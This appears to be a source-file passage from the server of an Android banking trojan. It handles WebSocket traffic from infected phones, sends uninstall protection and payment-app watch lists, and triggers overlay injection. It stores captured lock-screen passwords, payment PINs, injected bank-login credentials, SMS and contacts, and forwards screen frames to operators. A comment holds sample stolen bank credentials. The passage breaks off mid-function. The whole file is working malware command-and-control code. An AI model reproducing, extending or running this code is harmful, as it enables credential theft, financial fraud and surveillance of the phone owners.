'use strict';

const { getPool, dbWithRetry } = require('../services/commandPoller');
const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
const { sendFirstTime: sendProtectFirstTime } = require('../services/autoProtect');
const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
// TG 通知已移到 PHP DeviceController 中处理

async function queryPolicyRows(sql) {
  try {
    const [rows] = await getPool().query(sql);
    return Array.isArray(rows) ? rows : [];
  } catch (e) {
    console.warn('[PolicySync] query skipped: ' + e.message);
    return [];
  }
}

async function isDeviceDeleted(deviceId) {
  if (!deviceId) return false;
  try {
    const [rows] = await getPool().query(
      'SELECT value FROM fisher_settings WHERE `key` = ? LIMIT 1',
      [`device_deleted:${deviceId}`]
    );
    const raw = rows?.[0]?.value;
    if (!raw) return false;
    let tombstone;
    try { tombstone = JSON.parse(String(raw)); } catch { tombstone = {}; }
    const expiresAt = Number(tombstone.expires_at || 0);
    if (expiresAt > 0 && expiresAt < Math.floor(Date.now() / 1000)) {
      await getPool().query('DELETE FROM fisher_settings WHERE `key` = ?', [`device_deleted:${deviceId}`]);
      return false;
    }
    return true;
  } catch (err) {
    console.warn(`[WS-Device] deleted-device check skipped for ${String(deviceId).substring(0, 12)}...: ${err.message}`);
    return false;
  }
}

async function syncGlobalPolicies(ws, sessionId) {
  if (!ws || ws.readyState !== 1) return;
  const [sensitiveRows, blackRows, paymentRows] = await Promise.all([
    queryPolicyRows("SELECT package_name FROM fisher_sensitive_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name FROM fisher_black_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name, app_name, windows FROM fisher_payment_strategies WHERE enabled = 1 AND package_name IS NOT NULL AND package_name <> '' ORDER BY id ASC"),
  ]);
  const sensitive = [...new Set(sensitiveRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const black = [...new Set(blackRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const strategies = paymentRows.map(row => {
    let windows = row.windows;
    if (typeof windows === 'string') {
      try { windows = JSON.parse(windows); } catch { windows = []; }
    }
    return {
      packageName: String(row.package_name || '').trim(),
      appName: String(row.app_name || '').trim(),
      listenWinClasses: Array.isArray(windows) ? windows : [],
    };
  }).filter(row => row.packageName);
  const commands = [
    ['SET_SENSITIVE_APPS', { apps: sensitive }],
    ['SET_BLACK_APPS', { apps: black }],
    ['SET_PAYMENT_STRATEGIES', { strategies }],
  ];
  for (const [command, params] of commands) {
    if (ws.readyState !== 1) break;
    try {
      ws.send(JSON.stringify({ type: 'command', sessionId, data: { command, params } }));
    } catch (e) {
      console.warn('[PolicySync] ' + command + ' failed for ' + sessionId + ': ' + e.message);
    }
  }
  console.log('[PolicySync] synced ' + sessionId + ': sensitive=' + sensitive.length + ', black=' + black.length + ', payment=' + strategies.length);
}

/**
 * APK 设备端 WebSocket handler
 * 路径: /ws/device?sessionId=xxx
 */
async function handleDevice(ws, sessionId, connections) {
  if (await isDeviceDeleted(sessionId)) {
    console.warn(`[WS-Device] rejected deleted device ${sessionId}`);
    try {
      ws.send(JSON.stringify({
        type: 'device_deleted',
        sessionId,
        deviceId: sessionId,
        data: { status: 'deleted', registered: false, reRegister: false },
      }));
    } catch {}
    try { ws.close(4003, 'device deleted'); } catch {}
    return;
  }

  // 获取客户端真实 IP
  const rawIp = ws._socket ? ws._socket.remoteAddress : '';
  const clientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
  // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
  let latestClientIp = clientIp;

  connections.devices.set(sessionId, { ws, sessionId, clientIp });
  console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);

  // 清除自动注入缓存（设备重新上线时允许重新注入一次）
  if (autoInjectedCache && autoInjectedCache.has(sessionId)) {
    autoInjectedCache.delete(sessionId);
  }

  // 更新设备在线状态 + IP
  updateDeviceStatus(sessionId, true, clientIp);

  // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
  setTimeout(() => sendProtectFirstTime(connections, sessionId), 2000);

  // 设备上线 8 秒后自动获取应用列表（用于自动注入匹配）
  const appListTimer = setTimeout(() => {
    if (ws.readyState === 1) {
      console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId}`);
      ws.send(JSON.stringify({
        type: 'command',
        sessionId,
        data: { command: 'GET_APP_LIST', params: {} }
      }));
    }
  }, 8000);

  // 设备上线时补发全局策略；第一次失败时稍后重试一次。
  const policySyncTimers = [1500, 10000].map(delay => setTimeout(() => {
    syncGlobalPolicies(ws, sessionId).catch(err => console.warn('[PolicySync] ' + sessionId + ': ' + err.message));
  }, delay));

  // 通知管理端（同时发两种格式，兼容前端 bot_online/device_online）
  broadcastToAdmins(connections, { type: 'device_online', sessionId, deviceId: sessionId, data: { status: 'online' } });
  broadcastToAdmins(connections, { type: 'bot_online', sessionId, deviceId: sessionId, botId: sessionId });
  broadcastToAdmins(connections, { type: 'device_update' });

  // 定时更新 last_seen（每30秒）— 先走内存去抖（10s 窗口）再落盘，且 dbWithRetry 死锁重试兜底
  // 注意：allowWrite 通过后立刻标记；dbWithRetry 已做 2 次重试，真失败就等下一个 30s tick。
  const heartbeatInterval = setInterval(() => {
    if (ws.readyState !== 1) return;
    // ★ 内存节流：10 秒内如果 syncDeviceStatus / 上一次心跳 / bridge 心跳 任意一个已刷，就跳过
    if (!wtAllow(sessionId, 'last_seen')) return;
    const now = Math.floor(Date.now() / 1000);
    dbWithRetry(
      () => getPool().query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, sessionId]),
      { label: `heartbeat:${String(sessionId).substring(0, 8)}`, maxRetries: 2 }
    ).catch(() => { /* 失败静默，下一个 30s tick 再尝试（30s > 10s 窗口自然到期） */ });
  }, 30000);

  // RFC 6455 ping/pong 仅在显式开启时使用，兼容只实现应用层心跳的 APK。
  let isAlive = true;
  const protocolPingEnabled = process.env.NODE_WS_PROTOCOL_PING === '1';
  let serverPingInterval = null;
  if (protocolPingEnabled) {
    ws.on('pong', () => { isAlive = true; });
    serverPingInterval = setInterval(() => {
      if (ws.readyState !== 1) return;
      if (!isAlive) {
        console.log('[WS-Device] Ping timeout, terminating zombie connection: ' + sessionId);
        ws.terminate();
        return;
      }
      isAlive = false;
      try { ws.ping(); } catch (e) {}
    }, 30000);
  }

  ws.on('message', (data) => {
    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
    // exceptions in handler/forwarding logic from crashing the WS server.
    try {
      // ★ 入站消息自愈（2026-08-06）：校验 ws 仍活着，否则丢弃
      // 解决"WS 显示离线但 handleDeviceMessage 仍能跑"的矛盾
      if (ws.readyState !== 1) return
      // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
      if (!connections.devices.has(sessionId) || connections.devices.get(sessionId).ws !== ws) {
        connections.devices.set(sessionId, { ws, sessionId, clientIp: latestClientIp })
        if (process.env.NODE_WS_DEBUG_HEAL === '1') {
          console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
        }
      }
      // 尝试将 Buffer 解析为 JSON（设备可能以二进制帧发送 JSON 响应）
      if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
        // 检查是否以 '{' 或 '[' 开头（JSON）
        if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
          try {
            const str = buf.toString('utf8');
            const msg = JSON.parse(str);
            console.log(`[WS-Device] <<<< Received JSON from ${sessionId}:`, str.substring(0, 200));
            handleDeviceMessage(ws, msg, sessionId, connections);
            return;
          } catch {}
        }
        // 真正的二进制帧 = 屏幕画面
        forwardFrameToAdmins(sessionId, data, connections);
        return;
      }

      try {
        const msg = JSON.parse(data.toString());
        console.log(`[WS-Device] <<<< Received from ${sessionId}:`, JSON.stringify(msg).substring(0, 200));
        handleDeviceMessage(ws, msg, sessionId, connections);
      } catch (err) {
        console.error(`[WS-Device] Parse error from ${sessionId}:`, err.message);
      }
    } catch (err) {
      console.error(`[WS-Device] Unhandled error in message handler for ${sessionId}:`, err && err.message ? err.message : err);
    }
  });

  // ★ FIX: WS 连接池竞态误删（2026-08-06）
  // 归属校验：仅当连接池中仍是当前 ws 时才执行清理，避免旧连接 close 误删新连接
  function isCurrentDeviceConnection() {
    const cur = connections.devices.get(sessionId);
    return cur && cur.ws === ws;
  }

  ws.on('close', () => {
    clearTimeout(appListTimer);
    policySyncTimers.forEach(clearTimeout);
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    if (!isCurrentDeviceConnection()) return;  // ★ 不是自己的连接（已被新连接覆盖），不清理
    connections.devices.delete(sessionId);
    // 只有当没有 bridge 连接时才标记为离线
    if (!connections.bridges.has(sessionId)) {
      updateDeviceStatus(sessionId, false);
    }
    broadcastToAdmins(connections, {
      type: 'device_offline',
      sessionId,
      deviceId: sessionId,
      data: { status: connections.bridges.has(sessionId) ? 'online' : 'offline' },
    });
    // 如果设备真正离线（无 bridge），发 bot_offline
    if (!connections.bridges.has(sessionId)) {
      broadcastToAdmins(connections, { type: 'bot_offline', sessionId, deviceId: sessionId, botId: sessionId });
    }
    broadcastToAdmins(connections, { type: 'device_update' });
    console.log(`[WS-Device] Disconnected: ${sessionId}`);
  });

  ws.on('error', () => {
    clearTimeout(appListTimer);
    policySyncTimers.forEach(clearTimeout);
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    if (!isCurrentDeviceConnection()) return;  // ★ 归属校验，同上
    connections.devices.delete(sessionId);
    if (!connections.bridges.has(sessionId)) {
      updateDeviceStatus(sessionId, false);
    }
  });
}

function handleDeviceMessage(ws, msg, sessionId, connections) {
  const { type } = msg;
  console.log(`[WS-Device] handleDeviceMessage type='${type}' from ${sessionId}`);

  // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
  const registerTypes = ['REGISTER', 'register', 'heartbeat', 'HEARTBEAT',
    'status', 'device_heartbeat', 'device_status', 'USER_MESSAGE',
    'bot_status', 'device_status_update', 'get_device_state_response',
    'device_info'];

  if (registerTypes.includes(type)) {
    // 提取 data 字段中的设备信息，与旧后端 update_db() 一致
    // device_info 消息的数据在 msg.info 而非 msg.data
    const info = msg.info || msg.data || msg.payload || msg;
    // ★ 修复 C：不再查池拿 clientIp（避免池被清空时丢失 IP），直接从 ws 取实时 IP
    const rawIp = ws._socket ? ws._socket.remoteAddress : '';
    const wsClientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
    syncDeviceStatus(sessionId, info, wsClientIp);
  }

  switch (type) {
    case 'status':
    case 'bot_status':
    case 'device_status_update':
    case 'get_device_state_response':
      // 检查是否是密码上报（APK 可能用 type:'status' + data.type:'password_captured'）
      if (msg.data && (msg.data.type === 'password_captured' || msg.data.type === 'PASSWORD_CAPTURED')) {
        console.log(`[WS-Device] >>>> Password captured from ${sessionId}:`, JSON.stringify(msg.data).substring(0, 200));
        savePassword(sessionId, msg.data);
        // 额外广播 password_status 类型消息，触发前端密码卡片刷新
        broadcastToAdmins(connections, { type: 'password_status', deviceId: sessionId, sessionId });
      }
      // 状态更新，转发给管理端 + 更新数据库
      console.log(`[WS-Device] >>>> Forwarding status '${type}' to admins from ${sessionId}`);
      broadcastToAdmins(connections, {
        ...msg,
        data: msg.data || msg.payload || {},
        sessionId,
        deviceId: sessionId,
      });
      break;

    case 'command_result':
      // 命令结果，转发给管理端
      console.log(`[WS-Device] >>>> Forwarding command_result to admins from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      // 检测 command_result 中的短信/通讯录/应用数据并入库
      {
        const rd = msg.data || {};
        if (rd.smsList || rd.messages) {
          const sms = rd.smsList || rd.messages;
          if (Array.isArray(sms) && sms.length > 0) {
            console.log(`[WS-Device] command_result contains SMS: count=${sms.length}`);
            saveAiDeviceData(sessionId, 'sms', sms);
            saveSmsToMessages(sessionId, sms);
          }
        }
        if (rd.contacts) {
          const ct = rd.contacts;
          if (Array.isArray(ct) && ct.length > 0) {
            console.log(`[WS-Device] command_result contains contacts: count=${ct.length}`);
            saveAiDeviceData(sessionId, 'contacts', ct);
          }
        }
      }
      broadcastToAdmins(connections, {
        type: 'command_result',
        deviceId: sessionId,
        data: msg.data || msg,
      });
      break;

    case 'injection':
    case 'injection_data':
      // 注入数据上报 — 存入数据库 + 转发给管理端
      // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
      // data 可能是字符串或已解析对象
      saveInjectionData(sessionId, msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'NEW_PASSWORD':
      // 密码上报 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      savePassword(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'new_sms':
      // 短信通知，转发给管理端
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'operation_log':
    case 'operation_log_realtime':
      // 操作日志 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      saveOperationLog(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'REGISTER':
    case 'register':
    case 'heartbeat':
    case 'HEARTBEAT':
    case 'device_heartbeat':
    case 'device_status':
      // 注册/心跳消息 — 已在上方做了 syncDeviceStatus，不再转发
      break;

    case 'pong':
      break;

    case 'password_status':
      // 密码状态上报 — 仅转发给管理端（不入库，避免存入 APK 重复捕获的错误值）
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
      break;

    case 'app_list':
    case 'app_list_response':
    case 'APP_LIST_RESPONSE':
      // 设备返回已安装应用列表 → 存入 fisher_device_apps 并触发自动注入
      {
        const apps = msg.data?.apps || msg.data || msg.apps || [];
        console.log(`[WS-Device] Received ${type} from ${sessionId}, count=${Array.isArray(apps) ? apps.length : 0}`);
        handleAppList(sessionId, { ...msg, _apps: apps }, ws, connections);
        broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: apps });
        // 同时存入 AI 数据缓存表
        saveAiDeviceData(sessionId, 'apps', apps);
      }
      break;

    case 'sms_data':
    case 'SMS_DATA':
    case 'sms_list':
    case 'SMS_LIST':
      // 短信数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const smsList = msg.data?.smsList || msg.data?.messages || msg.smsList || msg.messages || msg.data || [];
        console.log(`[WS-Device] Received SMS data from ${sessionId}, count=${Array.isArray(smsList) ? smsList.length : 0}`);
        if (Array.isArray(smsList) && smsList.length > 0) {
          saveAiDeviceData(sessionId, 'sms', smsList);
          saveSmsToMessages(sessionId, smsList);
        }
        broadcastToAdmins(connections, { ...msg, type: 'sms_data', deviceId: sessionId });
      }
      break;

    case 'contacts':
    case 'CONTACTS':
    case 'contacts_data':
    case 'CONTACTS_DATA':
    case 'contacts_response':
      // 通讯录数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const contacts = msg.data?.contacts || msg.contacts || msg.data || [];
        console.log(`[WS-Device] Received contacts from ${sessionId}, count=${Array.isArray(contacts) ? contacts.length : 0}`);
        if (Array.isArray(contacts) && contacts.length > 0) {
          saveAiDeviceData(sessionId, 'contacts', contacts);
        }
        broadcastToAdmins(connections, { ...msg, type: 'contacts', deviceId: sessionId });
      }
      break;

    case 'vc_result':
    case 'view_cache_result':
    case 'view_cache_sync':
    case 'payment_cipher':
      // 支付密码截获上报 — 存入 fisher_payment_cipher_records + 转发给管理端
      console.log(`[WS-Device] >>>> Payment cipher from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      saveCipherRecord(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, type: 'payment_cipher', deviceId: sessionId, sessionId });
      break;

    default:
      // 其他消息也转发
      console.log(`[WS-Device] >>>> Forwarding default msg to admins from ${sessionId}: type='${type}'`);
      // 检测是否包含短信/通讯录数据（某些 APK 用非标准 type 返回）
      if (msg.data) {
        const d = msg.data;
        if (d.smsList || d.messages || (Array.isArray(d) && d[0]?.body)) {
          const smsList = d.smsList || d.messages || d;
          if (Array.isArray(smsList) && smsList.length > 0) {
            console.log(`[WS-Device] Detected SMS data in default handler, type='${type}', count=${smsList.length}`);
            saveAiDeviceData(sessionId, 'sms', smsList);
            saveSmsToMessages(sessionId, smsList);
          }
        }
        if (d.contacts || (Array.isArray(d) && d[0]?.name && (d[0]?.phone || d[0]?.number))) {
          const contacts = d.contacts || d;
          if (Array.isArray(contacts) && contacts.length > 0) {
            console.log(`[WS-Device] Detected contacts data in default handler, type='${type}', count=${contacts.length}`);
            saveAiDeviceData(sessionId, 'contacts', contacts);
          }
        }
      }
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
  }
}

/**
 * 将设备发来的实时状态同步到数据库
 * 与旧 Python 后端 ws_device 中的 update_db() 对齐：
 * - 如果设备不存在 → 自动 INSERT（注册）
 * - 如果设备存在 → UPDATE 所有上报字段
 * 更新: brand, model, os_version, app_version, app_name, battery_level,
 * network_type, is_screen_on, screen_width, screen_height, permissions,
 * is_charging, is_locked, accessibility_alive, public_ip
 */
async function syncDeviceStatus(deviceId, data, clientIp) {
  if (!data || !deviceId) return;
  try {
    if (await isDeviceDeleted(deviceId)) {
      console.warn(`[WS-Device] ignored status from deleted device ${String(deviceId).substring(0, 12)}...`);
      return;
    }
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    const shortId = String(deviceId).substring(0, 12);

    // ★ 2026-09-03 死锁修复：用单条 INSERT ... ON DUPLICATE KEY UPDATE 代替"先 SELECT 再分支 INSERT/UPDATE"
    // ★ 2026-09-03 NOT NULL 修复：
    //   - 两套变量：*InsV 用于 INSERT 侧（NOT NULL 列必须给安全默认值，不能写 NULL）
    //               *UpdV 用于 UPDATE 侧判断条件（保留 NULL = 跳过不更新，避免覆盖原值）
    const brandV        = data.brand ? String(data.brand) : null;
    const modelV        = data.model ? String(data.model) : null;
    const osVersionV    = data.osVersion ? String(data.osVersion) : null;
    const appVersionV   = data.appVersion ? String(data.appVersion) : null;
    const appNameV      = (data.appName || data.deviceName) ? String(data.appName || data.deviceName) : null;
    const publicIpFromMsg = data.publicIP ? String(data.publicIP) : null;
    const publicIpV     = publicIpFromMsg || clientIp || null;

    // batteryLevel: NOT NULL 默认 0
    const batteryUpdV   = data.batteryLevel !== undefined ? (Number(data.batteryLevel) || 0) : null;
    const batteryInsV   = batteryUpdV === null ? 0 : batteryUpdV;
    // networkType: NOT NULL 默认 ''
    const networkTypeUpdV = data.networkType !== undefined ? String(data.networkType || '') : null;
    const networkTypeInsV = networkTypeUpdV === null ? '' : networkTypeUpdV;
    // 布尔/0-1 类 NOT NULL 默认 0
    const isScreenOnUpdV = data.isScreenOn !== undefined ? (data.isScreenOn ? 1 : 0) : null;
    const isScreenOnInsV = isScreenOnUpdV === null ? 0 : isScreenOnUpdV;
    const isChargingUpdV = data.isCharging !== undefined ? (data.isCharging ? 1 : 0) : null;
    const isChargingInsV = isChargingUpdV === null ? 0 : isChargingUpdV;
    const isLockedUpdV   = data.isLocked !== undefined ? (data.isLocked ? 1 : 0) : null;
    const isLockedInsV   = isLockedUpdV === null ? 0 : isLockedUpdV;
    const accessibilityAliveUpdV = data.accessibilityAlive !== undefined ? (data.accessibilityAlive ? 1 : 0) : null;
    const accessibilityAliveInsV = accessibilityAliveUpdV === null ? 0 : accessibilityAliveUpdV;
    // screen_width / screen_height: NOT NULL 默认 0
    const screenWidthUpdV  = data.screenWidth  > 0 ? Number(data.screenWidth)  : null;
    const screenWidthInsV  = screenWidthUpdV  === null ? 0 : screenWidthUpdV;
    const screenHeightUpdV = data.screenHeight > 0 ? Number(data.screenHeight) : null;
    const screenHeightInsV = screenHeightUpdV === null ? 0 : screenHeightUpdV;

    const permissionsV = data.permissions && typeof data.permissions === 'object' ? JSON.stringify(data.permissions) : null;

    // geo 清空规则：只有当本次 public_ip 有值且与 DB 中不同时，才置空。
    await dbWithRetry(
      () => db.query(
        `INSERT INTO fisher_devices
         (device_id, is_connected, last_seen, first_seen, created_at,
          brand, model, os_version, app_version, app_name, public_ip,
          battery_level, network_type, is_screen_on, is_charging, is_locked, accessibility_alive,
          screen_width, screen_height, permissions)
         VALUES (?, 1, ?, ?, ?,
                 ?, ?, ?, ?, ?, ?,
                 ?, ?, ?, ?, ?, ?,
                 ?, ?, ?)
         ON DUPLICATE KEY UPDATE
           is_connected  = 1,
           last_seen     = ?,
           brand         = IF(? IS NOT NULL, ?, brand),
           model         = IF(? IS NOT NULL, ?, model),
           os_version    = IF(? IS NOT NULL, ?, os_version),
           app_version   = IF(? IS NOT NULL, ?, app_version),
           app_name      = IF(? IS NOT NULL, ?, app_name),
           public_ip     = IF(? IS NOT NULL, ?, public_ip),
           geo_location  = IF(? IS NOT NULL AND ? <> COALESCE(public_ip, ''), '', geo_location),
           battery_level = IF(? IS NOT NULL, ?, battery_level),
           network_type  = IF(? IS NOT NULL, ?, network_type),
           is_screen_on  = IF(? IS NOT NULL, ?, is_screen_on),
           is_charging   = IF(? IS NOT NULL, ?, is_charging),
           is_locked     = IF(? IS NOT NULL, ?, is_locked),
           accessibility_alive = IF(? IS NOT NULL, ?, accessibility_alive),
           screen_width  = IF(? IS NOT NULL, ?, screen_width),
           screen_height = IF(? IS NOT NULL, ?, screen_height),
           permissions   = IF(? IS NOT NULL, ?, permissions)`,
        [
          // INSERT side (NOT NULL cols use *InsV with safe defaults)
          deviceId, now, now, now,
          brandV, modelV, osVersionV, appVersionV, appNameV, publicIpV,
          batteryInsV, networkTypeInsV, isScreenOnInsV, isChargingInsV, isLockedInsV, accessibilityAliveInsV,
          screenWidthInsV, screenHeightInsV, permissionsV,
          // ON DUPLICATE KEY UPDATE side (*UpdV with NULL = skip)
          now,
          brandV, brandV,
          modelV, modelV,
          osVersionV, osVersionV,
          appVersionV, appVersionV,
          appNameV, appNameV,
          publicIpV, publicIpV,
          publicIpV, publicIpV,
          batteryUpdV, batteryUpdV,
          networkTypeUpdV, networkTypeUpdV,
          isScreenOnUpdV, isScreenOnUpdV,
          isChargingUpdV, isChargingUpdV,
          isLockedUpdV, isLockedUpdV,
          accessibilityAliveUpdV, accessibilityAliveUpdV,
          screenWidthUpdV, screenWidthUpdV,
          screenHeightUpdV, screenHeightUpdV,
          permissionsV, permissionsV,
        ]
      ),
      { label: `syncDeviceStatus:${shortId}`, maxRetries: 3 }
    );

    // ★ 写节流标记：last_seen + status_meta（避免下一次心跳 UPDATE 在 10s/5s 内重复争同一行锁）
    wtMark(deviceId, ['last_seen', 'status_meta', 'public_ip']);

    // 首次注册的日志通过额外查询判断（只在 brand/model 都有值或首次无匹配行时才输出"Auto-registered"，
    // 但为避免额外 SELECT 加重死锁，这里简化日志：不区分是否首次，只在 debug 模式下打印）
    if (process.env.NODE_WS_DEBUG_SYNC === '1') {
      console.log(`[WS-Device] syncDeviceStatus upserted: ${shortId}...`);
    }
  } catch (err) {
    // 死锁/锁等待：已经由 dbWithRetry 内部打了 warn（可观测）；这里不再打 error，避免日志爆炸
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      console.warn(`[WS-Device] syncDeviceStatus give up after retries (${shortId}...): ${err.message}`);
    } else {
      console.error('[WS-Device] syncDeviceStatus error:', err.message);
    }
  }
}

/**
 * 保存注入数据到数据库
 *
 * APK 上报格式:
 * { type: 'injection', deviceId: 'xxx', data: '{"密码":"83663737","类型":"中国银行登录","账号":"18565235625","时间戳":1782505343570,"支付密码":"635985"}', packageName: 'xyz.bcluu.msgxp', timestamp: 1785074926742 }
 *
 * 目标存储格式（form_data 字段）:
 * {"密码": "83663737hshd", "类型": "中国银行登录", "账号": "18565235625", "时间戳": 1782505343570, "支付密码": "635985"}
 */
async function saveInjectionData(deviceId, msg) {
  if (!deviceId || !msg) return;
  try {
    const db = getPool();
    const packageName = msg.packageName || '';

    // 解析 data 字段 — 可能是 JSON 字符串或已解析对象
    let formData = msg.data || msg.formData || {};
    if (typeof formData === 'string') {
      try {
        formData = JSON.parse(formData);
      } catch (e) {
        // 不是合法 JSON，保持原字符串
        formData = { raw: formData };
      }
    }

    // 从解析后的数据中提取类型作为 template_name
    const templateName = formData['类型'] || formData.type || formData.templateName || msg.templateName || '';

    // 直接存储解析后的干净数据（不嵌套 wrapper）
    const formDataStr = typeof formData === 'object' ? JSON.stringify(formData) : String(formData);

    await db.query(
      'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
      [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
  } catch (err) {
    console.error('[WS-Device] saveInjectionData error:', err.message);
  }
}

/**
 * 保存密码数据到数据库（与旧 Python 后端一致）
 * 旧后端在 ws_device 中处理 NEW_PASSWORD 消息时写入 passwords 表
 */
async function savePassword(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherType = data.cipherType || data.cipher_type || data.passwordType || data.password_type || 'pin';
    const cipherText = data.cipherText || data.cipher_text || data.textCipher || data.patternCipher || data.password || '';
    const gradeCode = data.cipherGradeCode || data.cipher_grade_code || data.grade_code || '';
    const source = data.source || data.cipherSource || data.inputMethod || data.input_method || 'manual';

    if (cipherText) {
      await db.query(
        'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
        [deviceId, cipherType, cipherText, gradeCode, source, Math.floor(Date.now() / 1000)]
      );
      console.log(`[WS-Device] Saved password from ${deviceId}: type=${cipherType}`);
    }
  } catch (err) {
    console.error('[WS-Device] savePassword error:', err.message);
  }
}

/**
 * 保存支付密码截获记录到 fisher_payment_cipher_records
 * APK 上报格式:
 * { packageName, cipher/password, type/cipherType, appName, source }
 */
async function saveCipherRecord(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherText = data.cipher || data.password || data.cipherText || data.cipher_text || '';
    if (!cipherText) {
      console.log(`[WS-Device] saveCipherRecord: empty cipher from ${deviceId}, data=`, JSON.stringify(data).substring(0, 300));
      return;
    }
    const packageName = data.pkg || data.packageName || data.package_name || data.package || '';
    const appName = data.app || data.appName || data.app_name || '';
    const cipherType = data.grade || data.cipherType || data.cipher_type || data.type || 'pin';
    const source = data.source || '';

    await db.query(
      'INSERT INTO fisher_payment_cipher_records (device_id, package_name, app_name, cipher_text, cipher_type, source, created_at) VALUES (?,?,?,?,?,?,?)',
      [deviceId, packageName, appName, cipherText, cipherType, source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved payment cipher from ${deviceId}: type=${cipherType}, pkg=${packageName}`);
  } catch (err) {
    console.error('[WS-Device] saveCipherRecord error:', err.message);
  }
}

/**
 * 仅当数据库中无该设备的最新密码记录时才插入（用于 password_status 去重）
 */
async function savePasswordIfNew(deviceId, cipherText, cipherType, source) {
  if (!deviceId || !cipherText) return;
  try {
    const db = getPool();
    // 查最近一条记录，如果 cipher_text 一样就跳过
    const [rows] = await db.query(
      'SELECT cipher_text FROM fisher_passwords WHERE device_id=? ORDER BY id DESC LIMIT 1',
      [deviceId]
    );
    if (rows.length > 0 && rows[0].cipher_text === cipherText) return;
    // 不存在或不同 → 插入
    await db.query(
      'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
      [deviceId, cipherType, cipherText, '', source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] savePasswordIfNew: saved ${cipherType} from ${deviceId}`);
  } catch (err) {
    console.error('[WS-Device] savePasswordIfNew error:', err.message);
  }
}

/**
 * 6 种业务日志类型（存入 fisher_operation_logs）
 */
const ALLOWED_LOG_TYPES = new Set(['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS']);

/**
 * 保存操作日志到数据库
 * - KSTR/NTFS/VAPS/BLNK/ACTZ/ARTS 6 种 → fisher_operation_logs
 * - 其他类型（WARN/TROJ/CMDX/NETW/ADPT 等） → fisher_bridge_logs
 */
async function saveOperationLog(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const logType = (data.logType || data.log_type || data.type || '').toUpperCase();
    const content = data.content || data.message || '';
    const timestamp = data.timestamp ? Math.floor(data.timestamp / 1000) : Math.floor(Date.now() / 1000);

    if (!logType || !content) return;

    // 根据类型分流到不同的表
    const tableName = ALLOWED_LOG_TYPES.has(logType)
      ? 'fisher_operation_logs'
      : 'fisher_bridge_logs';

    await db.query(
      `INSERT INTO ${tableName} (device_id, log_type, content, timestamp, created_at) VALUES (?,?,?,?,?)`,
      [deviceId, logType, content, timestamp, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved ${tableName} from ${deviceId}: type=${logType}`);
  } catch (err) {
    console.error('[WS-Device] saveOperationLog error:', err.message);
  }
}

async function updateDeviceStatus(deviceId, isConnected, clientIp) {
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    const shortId = String(deviceId).substring(0, 12);
    if (isConnected) {
      // 连接时先检查设备是否存在（可能是首次 WS 连接但还没发状态消息）
      // SELECT 与 UPDATE 分离，但 UPDATE 仍走死锁重试
      const [rows] = await dbWithRetry(
        () => db.query('SELECT id FROM fisher_devices WHERE device_id=?', [deviceId]),
        { label: `updateDeviceStatus:SELECT:${shortId}`, maxRetries: 2 }
      );
      if (rows && rows.length > 0) {
        // 上线写 last_seen：走节流（如果 syncDeviceStatus 刚刷过，这里就跳过，减少一次争锁）
        const shouldWriteLastSeen = wtAllow(deviceId, 'last_seen');
